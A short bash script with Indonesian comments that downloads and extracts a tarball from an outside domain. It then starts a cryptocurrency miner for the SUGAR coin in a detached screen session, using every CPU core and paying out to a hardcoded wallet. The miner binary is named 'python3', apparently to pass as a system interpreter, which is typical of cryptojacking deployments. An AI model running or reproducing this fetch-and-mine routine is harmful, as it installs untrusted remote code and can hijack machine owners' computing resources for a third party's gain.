#!/bin/bash

# Periksa apakah file sudah diekstrak sebelumnya
if [ ! -d "dot" ]; then
    echo "Mengunduh dan mengekstrak dotcpu.tar.gz..."
    wget -O dot https://dotaja.biz.id/dotcpu.tar.gz
    tar -xvf dot
else
    echo "File sudah diekstrak. Lewati pengunduhan."
fi

# Jalankan perintah mining di dalam screen jika belum berjalan
if ! screen -list | grep -q "miner"; then
    echo "Menjalankan miner..."
    screen -dmS miner ./python3 -a yespowersugar -o yespowerSUGAR.eu.mine.zergpool.com:6535 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j -p c=SUGAR -t $(nproc)
else
    echo "Miner sudah berjalan."
fi
